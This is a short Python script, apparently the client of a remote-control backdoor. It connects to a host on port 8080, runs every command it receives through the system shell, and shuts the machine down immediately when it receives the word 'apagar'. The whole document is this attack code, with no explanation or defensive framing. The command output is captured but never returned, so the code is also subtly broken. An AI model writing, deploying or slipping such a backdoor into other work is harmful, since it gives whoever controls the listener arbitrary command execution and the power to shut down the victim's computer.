import subprocess, socket, os
H = '127.0.1.1'
P = 8080
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((H, P))
while True:
    d = s.recv(1024)
    if not d:break
    c = d.decode().strip()
    if c.strip() == 'exit':break
    elif c.strip() == 'apagar':
        if os.name == 'nt':os.system('shutdown /s /t 0')
        else:os.system('shutdown -h 0')
    o = subprocess.getoutput(c)
s.close()
